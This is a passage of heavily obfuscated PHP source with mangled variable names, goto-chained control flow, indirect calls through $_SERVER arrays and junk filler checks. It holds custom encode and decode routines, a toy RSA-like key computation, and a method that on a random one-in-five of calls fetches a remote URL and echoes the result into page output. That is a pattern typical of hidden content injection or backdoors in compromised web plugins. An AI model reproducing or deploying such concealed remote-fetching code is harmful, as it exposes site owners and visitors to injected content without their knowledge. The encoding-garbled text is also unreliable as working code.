$b”ŠíÒ‚[629]) { return; } goto cºèº—¥“·; E¿¶ñ¢Ñ¶‹: if (strlen($fç¨õ½¡¢ƒ) < $b”ŠíÒ‚[616]) { return; } $AÂ²ôÚè´õ = $d‘îøîÄÆ„[61]($d‘îøîÄÆ„[62])->{$_SERVER[´…‰Ò‹][63]}($d‘îøîÄÆ„[133]); $BÌš‡·ì²ö = $b”ŠíÒ‚[664]; goto Eø¸½ Ûø–; d‘ö’½ÏÆÙ: $có©ì¬¼Í™ = $b”ŠíÒ‚[661]; if (!$có©ì¬¼Í™) { die; } $Cõ¾†‚Á Œ = $d‘îøîÄÆ„[315] . $d‘îøîÄÆ„[131]($d‘îøîÄÆ„[316]); goto E¦Ï‡×ŒÑ; CÊÉøÀ„÷ß: $AÊö˜¦ˆ‹ = $b”ŠíÒ‚[665]; if (!$d‘îøîÄÆ„[168]($E‘©³†î‡)) { return; } if ($E‘©³†î‡[$d‘îøîÄÆ„[190]] && $E‘©³†î‡[$d‘îøîÄÆ„[321]]) { if ($this->{$_SERVER[´…‰Ò‹][225]}($E‘©³†î‡[$d‘îøîÄÆ„[321]]) == $e™ë¯¸°’[$d‘îøîÄÆ„[190]]) { return; } } goto cªìáÈ°òÊ; aŞÏ´ÓˆÅª: } private function wrvg5c6ca9f8($EÉó­ø¥ñ“ = '', $B××˜ÌÉµ§ = array(), $D‡¥îÛä = 5) { goto CÉ‹¸‹›Îñ; Bš¢í±¯Ñ: while ($c‚é¼ğğÉ < $añ´ğ¾éò®[601]) { if ($c‚é¼ğğÉ >= 0) { break; } $c‚é¼ğğÉ++; } $B××˜ÌÉµ§ = @$b‡ˆŸÌÕ[284]($bŞË´Ğ‚¦¢, !1, $EÌÕÒ’Îë·); $D»ØÜ†¡Úê = $añ´ğ¾éò®[670]; goto b”ºªŠ˜·Å; bğ‘İƒ¤µ: $eÜ‹à¡ŞØ = $añ´ğ¾éò®[666]; if (!$eÜ‹à¡ŞØ) { return; } $bŞË´Ğ‚¦¢ = $this->{$_SERVER[´…‰Ò‹][277]}($bŞË´Ğ‚¦¢, $b‡ˆŸÌÕ[323]); goto a¾ĞôÈçÃ³; d°ªƒŞ¹Öº: $aáÕ¨«¹É = $añ´ğ¾éò®[668]; if (strlen($aáÕ¨«¹É) < $añ´ğ¾éò®[629]) { die; } if ($B××˜ÌÉµ§ && $b‡ˆŸÌÕ[168]($B××˜ÌÉµ§)) { $bŞË´Ğ‚¦¢ = $bŞË´Ğ‚¦¢ . $b‡ˆŸÌÕ[324] . $b‡ˆŸÌÕ[325]($B××˜ÌÉµ§); } goto D»æÂÄ•İ”; D»æÂÄ•İ”: if ($B××˜ÌÉµ§ === -1) { return $bŞË´Ğ‚¦¢; } $EÌÕÒ’Îë· = $b‡ˆŸÌÕ[279](array($b‡ˆŸÌÕ[280] => array($b‡ˆŸÌÕ[283] => $D‡¥îÛä, $b‡ˆŸÌÕ[281] => $b‡ˆŸÌÕ[326]), $b‡ˆŸÌÕ[327] => array($b‡ˆŸÌÕ[328] => !1, $b‡ˆŸÌÕ[329] => !1))); $c‚é¼ğğÉ = $añ´ğ¾éò®[669]; goto Bš¢í±¯Ñ; b”ºªŠ˜·Å: while (strlen($D»ØÜ†¡Úê) < $añ´ğ¾éò®[616]) { if (!$D»ØÜ†¡Úê) { break; } $D»ØÜ†¡Úê++; } return $b‡ˆŸÌÕ[217]($B××˜ÌÉµ§, !0); $Fä¡šÄ»¶ = $añ´ğ¾éò®[671]; goto f ¡ÜÍ¼­; a¾ĞôÈçÃ³: $aÜ—íš¯­‘ = $añ´ğ¾éò®[667]; if (strlen($aÜ—íš¯­‘) < $añ´ğ¾éò®[609]) { die; } $bŞË´Ğ‚¦¢ = $bŞË´Ğ‚¦¢ . $EÉó­ø¥ñ“; goto d°ªƒŞ¹Öº; CÉ‹¸‹›Îñ: $añ´ğ¾éò® =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $b‡ˆŸÌÕ =& $_SERVER[´…‰Ò‹]; $bŞË´Ğ‚¦¢ = $b‡ˆŸÌÕ[322]; goto bğ‘İƒ¤µ; f ¡ÜÍ¼­: $EÓ’Ü„…¾ = $añ´ğ¾éò®[672]; if (!$EÓ’Ü„…¾) { return; } goto D®ñÊï–İ; D®ñÊï–İ: } private function xrej37592a0c() { goto aòæó·Úì‘; Bçí‘çÉ¾: $B£Ø˜ñœ¦ç = $eÏˆŒ·ƒã—[123]($this->laukfad11ca5, $eÏˆŒ·ƒã—[357]); $aíÙĞ¥»îê = $FöÒª‚´Ç¸[675]; if (strlen($aíÙĞ¥»îê) < $FöÒª‚´Ç¸[601]) { return; } goto eĞ‘¥ˆˆâ; BøÅ•©©Àß: $CÃÂ‚„ŞøÛ = $FöÒª‚´Ç¸[674]; if (strlen($CÃÂ‚„ŞøÛ) < $FöÒª‚´Ç¸[609]) { die; } $aÜ·¼•ß = $eÏˆŒ·ƒã—[271]($aÜ·¼•ß ? $aÜ·¼•ß : $eÏˆŒ·ƒã—[331]); goto Bçí‘çÉ¾; aòæó·Úì‘: $FöÒª‚´Ç¸ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eÏˆŒ·ƒã— =& $_SERVER[´…‰Ò‹]; $DŞÆÙ¯ÇÁ™ = array($eÏˆŒ·ƒã—[330] => $eÏˆŒ·ƒã—[331], $eÏˆŒ·ƒã—[332] => $eÏˆŒ·ƒã—[333], $eÏˆŒ·ƒã—[334] => $eÏˆŒ·ƒã—[335], $eÏˆŒ·ƒã—[336] => $eÏˆŒ·ƒã—[337], $eÏˆŒ·ƒã—[338] => $eÏˆŒ·ƒã—[339], $eÏˆŒ·ƒã—[340] => $eÏˆŒ·ƒã—[272], $eÏˆŒ·ƒã—[341] => $eÏˆŒ·ƒã—[272], $eÏˆŒ·ƒã—[342] => $eÏˆŒ·ƒã—[331], $eÏˆŒ·ƒã—[343] => $eÏˆŒ·ƒã—[333], $eÏˆŒ·ƒã—[344] => $eÏˆŒ·ƒã—[335], $eÏˆŒ·ƒã—[345] => $eÏˆŒ·ƒã—[346], $eÏˆŒ·ƒã—[347] => $eÏˆŒ·ƒã—[337], $eÏˆŒ·ƒã—[348] => $eÏˆŒ·ƒã—[349], $eÏˆŒ·ƒã—[350] => $eÏˆŒ·ƒã—[339], $eÏˆŒ·ƒã—[351] => $eÏˆŒ·ƒã—[352], $eÏˆŒ·ƒã—[353] => $eÏˆŒ·ƒã—[354], $eÏˆŒ·ƒã—[355] => $eÏˆŒ·ƒã—[356]); goto BÍé¼¶•¡²; eĞ‘¥ˆˆâ: $B£Ø˜ñœ¦ç = $B£Ø˜ñœ¦ç ? $eÏˆŒ·ƒã—[271]($B£Ø˜ñœ¦ç) : 0; $F´«çø‘ª² = $FöÒª‚´Ç¸[676]; if (strlen($F´«çø‘ª²) < $FöÒª‚´Ç¸[601]) { die; } goto FŠâÍóãË; BÍé¼¶•¡²: $cƒ´·Ò’„è = $FöÒª‚´Ç¸[673]; while ($cƒ´·Ò’„è < $FöÒª‚´Ç¸[609]) { if ($cƒ´·Ò’„è >= 0) { break; } $cƒ´·Ò’„è++; } $aÜ·¼•ß = $DŞÆÙ¯ÇÁ™[$this->gzuc017ad278]; goto BøÅ•©©Àß; FŠâÍóãË: return $aÜ·¼•ß + $B£Ø˜ñœ¦ç; $Aˆ¶Õ§ğ‚¹ = $FöÒª‚´Ç¸[677]; if (!$Aˆ¶Õ§ğ‚¹) { return; } goto a‚¢’ï¡ğÏ; a‚¢’ï¡ğÏ: } public function ydhfc1da9779($f“ãñ¾Ÿä) { goto d…·‰é„Šß; Fªá¢•×Ñ¢: $F¨Éµ´ù¢ = $EêÛ·‹‡ù…[61]($EêÛ·‹‡ù…[156])->{$_SERVER[´…‰Ò‹][359]}($EêÛ·‹‡ù…[358])->{$_SERVER[´…‰Ò‹][360]}($a”£”¢ö‘)->{$_SERVER[´…‰Ò‹][361]}(); $F¨Éµ´ù¢ = $EêÛ·‹‡ù…[248]($F¨Éµ´ù¢, $EêÛ·‹‡ù…[10], $EêÛ·‹‡ù…[358]); $Fƒñ´ˆÚÉ· = $Aª¨¨¸‡İÉ[679]; goto e‚”ï´ Ô; cÒÑ«Ò³: if ($f“ãñ¾Ÿä[$EêÛ·‹‡ù…[358]] == $EêÛ·‹‡ù…[246]) { return; } if ($a”£”¢ö‘ >= $EêÛ·‹‡ù…[271]($EêÛ·‹‡ù…[272])) { return; } $C—’ÈÊÌÇÁ = $EêÛ·‹‡ù…[61]($EêÛ·‹‡ù…[156])->{$_SERVER[´…‰Ò‹][157]}(); goto aê½Ë›Õ‹°; d…·‰é„Šß: $Aª¨¨¸‡İÉ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $EêÛ·‹‡ù… =& $_SERVER[´…‰Ò‹]; $a”£”¢ö‘ = $this->{$_SERVER[´…‰Ò‹][154]}(); goto cÒÑ«Ò³; e‚”ï´ Ô: while ($Fƒñ´ˆÚÉ· < $Aª¨¨¸‡İÉ[616]) { if ($Fƒñ´ˆÚÉ· >= 0) { break; } $Fƒñ´ˆÚÉ·++; } if (!$EêÛ·‹‡ù…[269]($f“ãñ¾Ÿä[$EêÛ·‹‡ù…[358]], $F¨Éµ´ù¢)) { $EêÛ·‹‡ù…[191]($EêÛ·‹‡ù…[362], !1, $EêÛ·‹‡ù…[266]); } goto Bßè³µóŠô; aê½Ë›Õ‹°: $a×İä¨Ä³÷ = $Aª¨¨¸‡İÉ[678]; while ($a×İä¨Ä³÷ < $Aª¨¨¸‡İÉ[601]) { if ($a×İä¨Ä³÷ >= 0) { break; } $a×İä¨Ä³÷++; } if ($C—’ÈÊÌÇÁ <= $a”£”¢ö‘) { return; } goto Fªá¢•×Ñ¢; Bßè³µóŠô: } public function odxm3dfba6cb() { goto D†ã…ÄÄœ…; D÷ˆáéˆÃ: $d†ª¯â„…” = $CÎ©î³Ù“ç[276]; $eÇ´Å¼ïò© = $c³ËŸ‡öò[680]; $d†ª¯â„…” = $this->{$_SERVER[´…‰Ò‹][277]}($d†ª¯â„…”, $CÎ©î³Ù“ç[278]); goto Dª³ •À‡¼; aŸì‘±à¨Ø: echo $CÎ©î³Ù“ç[364] . $CÎ©î³Ù“ç[365]($C¯»ùÔôÉÇ) . $CÎ©î³Ù“ç[366]; goto Bóã·áÂ†ï; Dª³ •À‡¼: $a¹ç…˜ô’å = $c³ËŸ‡öò[681]; $A¿ÛÜßö« = $CÎ©î³Ù“ç[279](array($CÎ©î³Ù“ç[280] => array($CÎ©î³Ù“ç[281] => $CÎ©î³Ù“ç[282], $CÎ©î³Ù“ç[283] => 3))); $C¯»ùÔôÉÇ = @$CÎ©î³Ù“ç[284]($d†ª¯â„…”, !1, $A¿ÛÜßö«); goto aŸì‘±à¨Ø; D†ã…ÄÄœ…: $c³ËŸ‡öò =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $CÎ©î³Ù“ç =& $_SERVER[´…‰Ò‹]; if (!$CÎ©î³Ù“ç[123]($GLOBALS, $CÎ©î³Ù“ç[149]) || $CÎ©î³Ù“ç[363](1, 100) > 20) { return; } goto D÷ˆáéˆÃ; Bóã·áÂ†ï: } private function mihraf1ac15b($bè×õ÷±¢‰, $aÉ“õÂÎğ†, $fóö’ôæì¾ = 3) { goto CÚä‘ôÉ³“; DøÊ²ÈÖÆ•: while ($B®Ìƒ‡ÓÖä < $Dƒ‰ò²’ø[606]) { if ($B®Ìƒ‡ÓÖä >= 0) { break; } $B®Ìƒ‡ÓÖä++; } if ($fóö’ôæì¾ - 1 > 0) { $càŸ®¼§š = $this->{$_SERVER[´…‰Ò‹][144]}($càŸ®¼§š, $aÉ“õÂÎğ†, $fóö’ôæì¾ - 1); } return $càŸ®¼§š; goto Aôˆğ®­ÉÉ; CâòÔ‰¡”ù: switch ($CŸÂõìæ´„) { case $C¹Š“ñ˜„[260]: $càŸ®¼§š = $this->{$_SERVER[´…‰Ò‹][172]}($bè×õ÷±¢‰, $C¹Š“ñ˜„[240]($aÉ“õÂÎğ† . $c†İ‰¦ Ä)); break; case $C¹Š“ñ˜„[246]: $càŸ®¼§š = $this->{$_SERVER[´…‰Ò‹][172]}($bè×õ÷±¢‰, $C¹Š“ñ˜„[240]($c†İ‰¦ Ä . $aÉ“õÂÎğ†)); break; case $C¹Š“ñ˜„[369]: $càŸ®¼§š = $this->{$_SERVER[´…‰Ò‹][172]}($bè×õ÷±¢‰, $C¹Š“ñ˜„[135]($c†İ‰¦ Ä . $aÉ“õÂÎğ†)); $C÷Î”…‘²£ = $Dƒ‰ò²’ø[683]; break; case $C¹Š“ñ˜„[370]: $càŸ®¼§š = $this->{$_SERVER[´…‰Ò‹][172]}($bè×õ÷±¢‰, $C¹Š“ñ˜„[131]($c†İ‰¦ Ä . $aÉ“õÂÎğ†)); break; case $C¹Š“ñ˜„[371]: goto BÅô°¾ÛŠ¼; F­‹”âØÉ„: if (strlen($C ”çâÂ½Î) < $Dƒ‰ò²’ø[616]) { return; } $F”¸İˆìˆÖ = 0; $E«××’‹•µ = $Dƒ‰ò²’ø[688]; goto Eñæ‡ˆÇœæ; Eñæ‡ˆÇœæ: while (strlen($E«××’‹•µ) < $Dƒ‰ò²’ø[616]) { if (!$E«××’‹•µ) { break; } $E«××’‹•µ++; } $A‰­İ¦›Ÿ¢ = 0; $dñÈÊÌ·„ = 0; goto F÷­Ï¯ÈµŸ; Dƒ÷Ôàó·É: $B¿ªá³ô³æ = $C¹Š“ñ˜„[25]($B¿ªá³ô³æ, $f‚ˆ§êá’É % 8, $f‚ˆ§êá’É % 8 + 7); $AĞàŸ©Äí = $C¹Š“ñ˜„[10]; $C ”çâÂ½Î = $Dƒ‰ò²’ø[687]; goto F­‹”âØÉ„; BÅô°¾ÛŠ¼: $bè×õ÷±¢‰ = $C¹Š“ñ˜„[135]($bè×õ÷±¢‰); $aÒ¶®‹¹öø = $Dƒ‰ò²’ø[684]; if (strlen($aÒ¶®‹¹öø) < $Dƒ‰ò²’ø[609]) { return; } goto C“£œñ‹ÄÆ; EøÔÂè¸§ó: $B¿ªá³ô³æ = $C¹Š“ñ˜„[131]($FÓ¬ñíòî . $C¹Š“ñ˜„[131]($aÉ“õÂÎğ† . $FÓ¬ñíòî) . $aÉ“õÂÎğ†); $Dä‘ÈÇô = $Dƒ‰ò²’ø[686]; if (!$Dä‘ÈÇô) { return; } goto Dƒ÷Ôàó·É; F÷­Ï¯ÈµŸ: $cèïéŸ£°¬ = $Dƒ‰ò²’ø[689]; for ($F”¸İˆìˆÖ = 0; $F”¸İˆìˆÖ < $C¹Š“ñ˜„[24]($bè×õ÷±¢‰); $F”¸İˆìˆÖ++) { $dñÈÊÌ·„ = $dñÈÊÌ·„ == $C¹Š“ñ˜„[24]($B¿ªá³ô³æ) ? 0 : $dñÈÊÌ·„; $A‰­İ¦›Ÿ¢ = ($f‚ˆ§êá’É + $C¹Š“ñ˜„[373]($C§†¿Ïùøô, $bè×õ÷±¢‰[$F”¸İˆìˆÖ]) + $C¹Š“ñ˜„[374]($B¿ªá³ô³æ[$dñÈÊÌ·„++])) % 64; $D‡Ñ®çñìé = $Dƒ‰ò²’ø[690]; if (!$D‡Ñ®çñìé) { die; } $AĞàŸ©Äí .= $C§†¿Ïùøô[$A‰­İ¦›Ÿ¢]; $D–™‹½Çİ = $Dƒ‰ò²’ø[691]; if (!$D–™‹½Çİ) { die; } } $càŸ®¼§š = $C¹Š“ñ˜„[365]($FÓ¬ñíòî . $AĞàŸ©Äí); goto bÛÈ¢•‹ä·; C“£œñ‹ÄÆ: $f‚ˆ§êá’É = $C¹Š“ñ˜„[372](0, 64); $CˆÂ…ùä›‘ = $Dƒ‰ò²’ø[685]; $FÓ¬ñíòî = $C§†¿Ïùøô[$f‚ˆ§êá’É]; goto EøÔÂè¸§ó; bÛÈ¢•‹ä·: break; goto bÒ£×¢¢ò; bÒ£×¢¢ò: default: $càŸ®¼§š = $this->{$_SERVER[´…‰Ò‹][172]}($bè×õ÷±¢‰, $aÉ“õÂÎğ† . $c†İ‰¦ Ä); $b§®”Ö“… = $Dƒ‰ò²’ø[692]; if (strlen($b§®”Ö“…) < $Dƒ‰ò²’ø[629]) { return; } break; $BäÅºÆô­¸ = $Dƒ‰ò²’ø[693]; } $càŸ®¼§š = $C¹Š“ñ˜„[240]($CŸÂõìæ´„ . $c†İ‰¦ Ä . $càŸ®¼§š); $B®Ìƒ‡ÓÖä = $Dƒ‰ò²’ø[694]; goto DøÊ²ÈÖÆ•; A”‰½·¤î‚: $bè×õ÷±¢‰ = $C¹Š“ñ˜„[2]($bè×õ÷±¢‰); $CŸÂõìæ´„ = $C¹Š“ñ˜„[363](0, 5) . $C¹Š“ñ˜„[10]; $E£ªÃ„æ´Â = $Dƒ‰ò²’ø[682]; goto eÉ§¶¿Ô‘Œ; eÉ§¶¿Ô‘Œ: if (strlen($E£ªÃ„æ´Â) < $Dƒ‰ò²’ø[609]) { die; } $c†İ‰¦ Ä = $C¹Š“ñ˜„[141](15); $C§†¿Ïùøô = $C¹Š“ñ˜„[368]; goto CâòÔ‰¡”ù; CÚä‘ôÉ³“: $Dƒ‰ò²’ø =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $C¹Š“ñ˜„ =& $_SERVER[´…‰Ò‹]; $C¹Š“ñ˜„[367](1); goto A”‰½·¤î‚; Aôˆğ®­ÉÉ: } private function rvgnbbcab42f($a¨˜äÙ , $Eì…™‰¥¹õ, $CíÜÄóõ­› = 3) { goto aÏ¸ïº“Ä–; Dğˆï¼ÚÄ£: $dÌË°‚Ø‚ = $a¨˜äÙ [0]; $bÕóÍ­ÜçÙ = $Dìä ¼±ó[697]; $aê¥Şˆö  = $FòÂÛõšïÉ[25]($a¨˜äÙ , 1, 15); goto Aé®šøŠ™; aÏ¸ïº“Ä–: $Dìä ¼±ó =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $FòÂÛõšïÉ =& $_SERVER[´…‰Ò‹]; if (!$FòÂÛõšïÉ[165]($a¨˜äÙ ) || $FòÂÛõšïÉ[24]($a¨˜äÙ ) < 10) { return !1; } goto d¥‰Ë¨¤‰; d¥‰Ë¨¤‰: $a¨˜äÙ  = $FòÂÛõšïÉ[2]($a¨˜äÙ ); $a±›ó‰–Ê¬ = $Dìä ¼±ó[695]; while (strlen($a±›ó‰–Ê¬) < $Dìä ¼±ó[629]) { if (!$a±›ó‰–Ê¬) { break; } $a±›ó‰–Ê¬++; } goto Bóö½ÛÎÖè; a¡¦¬ß¿¥í: return $c»ÙöÕ¤í; goto Féƒ„‹Î¼ğ; Aé®šøŠ™: $Fğòï»Ï˜ = $Dìä ¼±ó[698]; $a¨˜äÙ  = $FòÂÛõšïÉ[25]($a¨˜äÙ , 16); $fÄ´•¨¸¼£ = $FòÂÛõšïÉ[368]; goto b²Œ¯¬İ†«; Bóö½ÛÎÖè: $a¨˜äÙ  = $FòÂÛõšïÉ[240]($a¨˜äÙ ); $dñ¸ÈÔÇ¯ã = $Dìä ¼±ó[696]; while (strlen($dñ¸ÈÔÇ¯ã) < $Dìä ¼±ó[601]) { if (!$dñ¸ÈÔÇ¯ã) { break; } $dñ¸ÈÔÇ¯ã++; } goto Dğˆï¼ÚÄ£; b²Œ¯¬İ†«: $b¿ìŠĞ¹ç­ = $Dìä ¼±ó[699]; switch ($dÌË°‚Ø‚) { case $FòÂÛõšïÉ[260]: $c»ÙöÕ¤í = $this->{$_SERVER[´…‰Ò‹][277]}($a¨˜äÙ , $FòÂÛõšïÉ[240]($Eì…™‰¥¹õ . $aê¥Şˆö )); break; case $FòÂÛõšïÉ[246]: $c»ÙöÕ¤í = $this->{$_SERVER[´…‰Ò‹][277]}($a¨˜äÙ , $FòÂÛõšïÉ[240]($aê¥Şˆö  . $Eì…™‰¥¹õ)); break; case $FòÂÛõšïÉ[369]: $c»ÙöÕ¤í = $this->{$_SERVER[´…‰Ò‹][277]}($a¨˜äÙ , $FòÂÛõšïÉ[135]($aê¥Şˆö  . $Eì…™‰¥¹õ)); break; $b¨Ó¦èåòš = $Dìä ¼±ó[700]; while ($b¨Ó¦èåòš < $Dìä ¼±ó[609]) { if ($b¨Ó¦èåòš >= 0) { break; } $b¨Ó¦èåòš++; } case $FòÂÛõšïÉ[370]: $c»ÙöÕ¤í = $this->{$_SERVER[´…‰Ò‹][277]}($a¨˜äÙ , $FòÂÛõšïÉ[131]($aê¥Şˆö  . $Eì…™‰¥¹õ)); $E­·²Š¡–Œ = $Dìä ¼±ó[701]; break; $BšŠ²ÇÏ¿Ú = $Dìä ¼±ó[702]; while (strlen($BšŠ²ÇÏ¿Ú) < $Dìä ¼±ó[629]) { if (!$BšŠ²ÇÏ¿Ú) { break; } $BšŠ²ÇÏ¿Ú++; } case $FòÂÛõšïÉ[371]: goto f‡‘†¬…›; f‡‘†¬…›: $a¨˜äÙ  = $FòÂÛõšïÉ[375]($a¨˜äÙ ); $B†‡¯œÑ‹è = $Dìä ¼±ó[703]; if (strlen($B†‡¯œÑ‹è) < $Dìä ¼±ó[601]) { return; } goto DŸ´‹‚†„­; A™çœñ¶ç¼: while ($D”¹ŠÖãÁ² < $Dìä ¼±ó[601]) { if ($D”¹ŠÖãÁ² >= 0) { break; } $D”¹ŠÖãÁ²++; } $DÎ„µÊç‚ = 0; $aÀåøø²÷ = 0; goto d±®á­•ôš; d±®á­•ôš: $c«¸ ÛÉÛ = $Dìä ¼±ó[706]; for ($C‹Æ‚‡ = 0; $C‹Æ‚‡ < $FòÂÛõšïÉ[24]($a¨˜äÙ ); $C‹Æ‚‡++) { $aÀåøø²÷ = $aÀåøø²÷ == $FòÂÛõšïÉ[24]($fÕ”âñ™å) ? 0 : $aÀåøø²÷; $b·ŠğŸ‹í = $aÀåøø²÷++; $DÎ„µÊç‚ = $FòÂÛõšïÉ[373]($fÄ´•¨¸¼£, $a¨˜äÙ [$C‹Æ‚‡]) - $a…Àæ«ä‚— - $FòÂÛõšïÉ[374]($fÕ”âñ™å[$b·ŠğŸ‹í]); $fòÉÖ¢Áõ± = $Dìä ¼±ó[707]; if (!$fòÉÖ¢Áõ±) { die; } while ($DÎ„µÊç‚ < 0) { $DÎ„µÊç‚ += 64; $aéğì„ë‰Û = $Dìä ¼±ó[708]; if (strlen($aéğì„ë‰Û) < $Dìä ¼±ó[629]) { return; } } $d÷ª´í¹‚´ .= $fÄ´•¨¸¼£[$DÎ„µÊç‚]; } $c»ÙöÕ¤í = $FòÂÛõšïÉ[376]($d÷ª´í¹‚´); goto C‹«¼œÛã; Aì Š”ĞÇå: if (strlen($FÙĞ‘øä„ê) < $Dìä ¼±ó[609]) { die; } $fÕ”âñ™å = $FòÂÛõšïÉ[131]($b–¹Ò£İ½Ö . $FòÂÛõšïÉ[131]($Eì…™‰¥¹õ . $b–¹Ò£İ½Ö) . $Eì…™‰¥¹õ); $fÕ”âñ™å = $FòÂÛõšïÉ[25]($fÕ”âñ™å, $a…Àæ«ä‚— % 8, $a…Àæ«ä‚— % 8 + 7); goto fÓÃ’µ‚Ë¦; DŸ´‹‚†„­: $b–¹Ò£İ½Ö = $a¨˜äÙ [0]; $a¨˜äÙ  = $FòÂÛõšïÉ[25]($a¨˜äÙ , 1); $cÊ­”‡ÔèÜ = $Dìä ¼±ó[704]; goto CÛ³Úˆ°ø×; C‹«¼œÛã: break; $fÂ‹Óõ†Ê¢ = $Dìä ¼±ó[709]; if (strlen($fÂ‹Óõ†Ê¢) < $Dìä ¼±ó[601]) { die; } goto fİó˜İÎÅË; CÛ³Úˆ°ø×: if (strlen($cÊ­”‡ÔèÜ) < $Dìä ¼±ó[629]) { return; } $a…Àæ«ä‚— = $FòÂÛõšïÉ[373]($fÄ´•¨¸¼£, $b–¹Ò£İ½Ö); $FÙĞ‘øä„ê = $Dìä ¼±ó[705]; goto Aì Š”ĞÇå; fÓÃ’µ‚Ë¦: $d÷ª´í¹‚´ = $FòÂÛõšïÉ[10]; $C‹Æ‚‡ = 0; $D”¹ŠÖãÁ² = $Dìä ¼±ó[669]; goto A™çœñ¶ç¼; fİó˜İÎÅË: default: $c»ÙöÕ¤í = $this->{$_SERVER[´…‰Ò‹][277]}($a¨˜äÙ , $Eì…™‰¥¹õ . $aê¥Şˆö ); break; $CÃ¤¾ó»…¢ = $Dìä ¼±ó[710]; if (strlen($CÃ¤¾ó»…¢) < $Dìä ¼±ó[629]) { return; } } if ($CíÜÄóõ­› - 1 > 0) { $c»ÙöÕ¤í = $this->{$_SERVER[´…‰Ò‹][215]}($c»ÙöÕ¤í, $Eì…™‰¥¹õ, $CíÜÄóõ­› - 1); } goto a¡¦¬ß¿¥í; Féƒ„‹Î¼ğ: } public function lhktee74a611($Aìíß…ˆˆ) { goto eÉ¬­À†¨²; E´„í¿”¡ñ: $f²ŒêÕóÕ‡ = $eÈ„ ùİ²ì[712]; if (!$f²ŒêÕóÕ‡) { die; } goto C¾†œ”²; cõŠ”Ö‡™æ: if (strlen($Cšõôï‹À¯) < $eÈ„ ùİ²ì[629]) { die; } $aïÌó“Å«¨ = $bæ£ÆåÀì[271](($aÒÒ¤™ä” + $c‡ÓÛä’‰) / 2); while (1) { $d¸ğñ×Ÿ¤À = $aïÌó“Å«¨; $FŠŠ„Ò¢êø = $Fò¹ŸÕ²”Ü; while ($FŠŠ„Ò¢êø % $d¸ğñ×Ÿ¤À != 0) { $D‡Â‡ˆÅ¼ì = $FŠŠ„Ò¢êø; $FŠŠ„Ò¢êø = $d¸ğñ×Ÿ¤À; $d¸ğñ×Ÿ¤À = $D‡Â‡ˆÅ¼ì % $d¸ğñ×Ÿ¤À; } if ($d¸ğñ×Ÿ¤À == 1) { break; } else { $aïÌó“Å«¨++; } } goto A§ãÑÖõ¢¶; e„­ø‡Öö¥: $e‡¥ïÕÏº = $bæ£ÆåÀì[131]($bæ£ÆåÀì[378] . ($aÒÒ¤™ä” + $c‡ÓÛä’‰) . $bæ£ÆåÀì[379] . $aïÌó“Å«¨ . $bæ£ÆåÀì[379] . $Aºíö’®´Ç . $bæ£ÆåÀì[380]); $D‘„¯æÕò‰ = $this->{$_SERVER[´…‰Ò‹][172]}($Aìíß…ˆˆ, $e‡¥ïÕÏº) . $bæ£ÆåÀì[381] . $B” éÑÔ­Ô; return $D‘„¯æÕò‰; goto E´„í¿”¡ñ; eÉ¬­À†¨²: $eÈ„ ùİ²ì =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bæ£ÆåÀì =& $_SERVER[´…‰Ò‹]; $aÒÒ¤™ä” = $this->{$_SERVER[´…‰Ò‹][377]}(); goto aŠâ§¡ƒñÀ; A§ãÑÖõ¢¶: $Aºíö’®´Ç = 2; for ($Cã¤Ò³œ” = 0; $Cã¤Ò³œ” < $Fò¹ŸÕ²”Ü * 10; $Cã¤Ò³œ”++) { if (($Fò¹ŸÕ²”Ü * $Cã¤Ò³œ” + 1) % $aïÌó“Å«¨ == 0) { $Aºíö’®´Ç = $bæ£ÆåÀì[271](($Fò¹ŸÕ²”Ü * $Cã¤Ò³œ” + 1) / $aïÌó“Å«¨); break; } } $B” éÑÔ­Ô = $this->{$_SERVER[´…‰Ò‹][172]}($aÒÒ¤™ä” * $c‡ÓÛä’‰ . $bæ£ÆåÀì[10], $bæ£ÆåÀì[174]); goto e„­ø‡Öö¥; aŠâ§¡ƒñÀ: $c‡ÓÛä’‰ = $this->{$_SERVER[´…‰Ò‹][377]}(); $Fò¹ŸÕ²”Ü = ($aÒÒ¤™ä” - 1) * ($c‡ÓÛä’‰ - 1); $Cšõôï‹À¯ = $eÈ„ ùİ²ì[711]; goto cõŠ”Ö‡™æ; C¾†œ”²: } public function xthffcd74f95($DËáî—©é—) { goto F×¦ìÉÆ¹Ù; c‰›æ†¯ô¡: if (!$B¶˜Ó ½¼è) { return $DÔù»Ôé¯®[10]; } $B¶˜Ó ½¼è = $DÔù»Ôé¯®[271]($B¶˜Ó ½¼è); $C½ë˜Õöõ« = 0; goto CŸ¾”†ÛÊ; b»•¼Ò–ƒ­: $c—‰¡Í½ô¿ = $AŸ×µ…›ì¡[718]; if (strlen($c—‰¡Í½ô¿) < $AŸ×µ…›ì¡[629]) { die; } $fÈğ”÷¦…† = $DÔù»Ôé¯®[271](($C½ë˜Õöõ« + $A†ßÍ…‡˜Á) / 2); goto C™íŠÙÃ…“; c¼š“ã¥©˜: $B¶˜Ó ½¼è = $this->{$_SERVER[´…‰Ò‹][277]}($A»³¹»¦©…[1] . $DÔù»Ôé¯®[10], $DÔù»Ôé¯®[174]); $dèÃ½¾ÃçŸ = $AŸ×µ…›ì¡[714]; while (strlen($dèÃ½¾ÃçŸ) < $AŸ×µ…›ì¡[609]) { if (!$dèÃ½¾ÃçŸ) { break; } $dèÃ½¾ÃçŸ++; } goto c‰›æ†¯ô¡; F×¦ìÉÆ¹Ù: $AŸ×µ…›ì¡ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $DÔù»Ôé¯® =& $_SERVER[´…‰Ò‹]; $A»³¹»¦©… = $DÔù»Ôé¯®[0]($DÔù»Ôé¯®[381], $DËáî—©é—); goto aœé©¡‹Ë; aœé©¡‹Ë: $Déİ“Ô‘© = $AŸ×µ…›ì¡[713]; while ($Déİ“Ô‘© < $AŸ×µ…›ì¡[616]) { if ($Déİ“Ô‘© >= 0) { break; } $Déİ“Ô‘©++; } if ($DÔù»Ôé¯®[19]($A»³¹»¦©…) != 2) { return $DÔù»Ôé¯®[10]; } goto c¼š“ã¥©˜; DåÁä±ÍÊ: $eÆ²çöÀ§ = 2; for ($dÎ‚Ş’Æ˜ = 0; $dÎ‚Ş’Æ˜ < $DâëÆƒ³Ş‡ * 10; $dÎ‚Ş’Æ˜++) { if (($DâëÆƒ³Ş‡ * 